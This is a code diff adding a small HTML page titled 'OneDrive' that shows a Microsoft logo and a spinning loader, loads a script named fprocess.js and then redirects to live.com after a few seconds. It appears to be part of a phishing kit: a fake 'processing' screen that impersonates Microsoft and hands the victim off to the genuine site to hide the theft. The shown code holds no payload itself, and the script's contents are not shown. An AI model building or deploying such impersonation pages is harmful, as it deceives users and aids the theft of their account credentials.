@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="f3lakutie">
+
+
+    <!-- favicon-->
+    <link rel="shortcut icon" href="micrologo.jpg" type="image/png">
+    <!-- for apple mobile devices -->
+    <link rel="apple-touch-icon-precomposed" href="micrologo.jpg" type="image/png" sizes="152x152">
+    <link rel="apple-touch-icon-precomposed" href="micrologo.jpg" type="image/png" sizes="120x120">
+
+
+
+    <!-- default style-->
+    <style>
+        /*
+        */
+        .outta{
+            margin: 0 auto;
+            
+            overflow: hidden;
+            position: static;
+            
+        }
+        .main{
+            
+            text-align: center;
+        }
+
+        .logo{
+            margin: 0 auto;
+            margin-bottom: 10ex;
+
+        }
+        
+        .loader {
+            border: 10px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 10px solid #3498db;
+            width: 130px;
+            height: 130px;
+            -webkit-animation: spin 2s linear infinite; /* Safari */
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto;
+            }
+
+            /* Safari */
+            @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+            }
+
+            @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+            }
+
+        .mlogo{
+            
+            margin-top: 5ex;
+            
+        
+        }
+        @media screen and (max-width: 510px) {
+
+            
+
+            .inner{
+                width: 100%;
+                top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%); ; 
+
+            }
+        }
+    </style>
+    <link href="style.css" rel="stylesheet">
+
+    <title>OneDrive</title>
+
+    
+
+  </head>
+
+  <body class="logpage">
+    
+    <div class="outta" >
+        <div class="inner">
+       
+            <div class="main">
+                <div class="loader"></div>
+                <div class="mlogo">
+                    <img src="microsoft_PNG17.png" height="20px">
+                </div>
+                
+            </div>
+        </div>
+		
+	</div>
+    
+        
+    <script src="script/fprocess.js"></script> 
+    <script>
+        
+        setTimeout(() => {
+            window.location.replace("https://live.com");
+        }, 4500);
+
+    </script> 
+  
+  </body>
+</html>
